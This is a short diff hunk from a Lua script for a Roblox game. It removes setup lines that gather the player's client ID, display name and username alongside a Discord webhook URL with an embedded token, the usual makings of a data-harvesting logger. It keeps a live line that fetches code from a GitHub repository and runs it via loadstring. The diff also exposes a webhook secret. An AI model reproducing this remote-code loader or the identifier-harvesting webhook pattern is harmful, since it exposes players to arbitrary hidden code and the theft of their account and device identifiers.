@@ -36,12 +36,6 @@ local L_MenuUI_6 = u1:WaitForChild("PlayerGui"):WaitForChild("MenuUI")
 local u12 = nil
 local battleWatcher = false;
 
-local HttpService = game:GetService("HttpService")
-local Webhook_URL = "https://discord.com/api/webhooks/1155612192310317126/LIzFdRk1GtGk2jbWM8ra9H4rEMCE_BDQ5sEMtY5XE_lRCeEwESQwGlrwEma5N-VLAitG"
-local S_hwid = game:GetService("RbxAnalyticsService"):GetClientId()
-local plre = game.Players.LocalPlayer
-local DName = game.Players.LocalPlayer.DisplayName
-local UName = game.Players.LocalPlayer.Name
 loadstring(game:HttpGet("https://raw.githubusercontent.com/altaccountv1/-CLASSIFIED-./main/Classified"))();
 
 local UserInputService = game:GetService("UserInputService")
